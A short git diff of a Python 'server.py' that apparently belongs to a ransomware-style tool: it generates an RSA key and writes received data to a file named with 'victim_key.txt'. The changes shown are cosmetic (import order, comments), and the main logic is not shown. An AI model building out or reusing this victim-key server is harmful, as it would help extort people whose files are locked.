@@ -1,13 +1,17 @@
-import socket
+# __Author__ __Lencof__
+# server.py
+
 import os
-import random
 import sys
+import random
+import socket
 import webbrowser
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
 
 random_file_name = str(random.randint(1, 10000)) + 'victim_key.txt'
 
+# create class Server():
 class Server:
     def __init__(self):
         self.key = RSA.generate(1024)
@@ -40,4 +44,4 @@ class Server:
             f.write(data)
 
 if __name__ == '__main__':
-    Server()
+    Server() # exit()
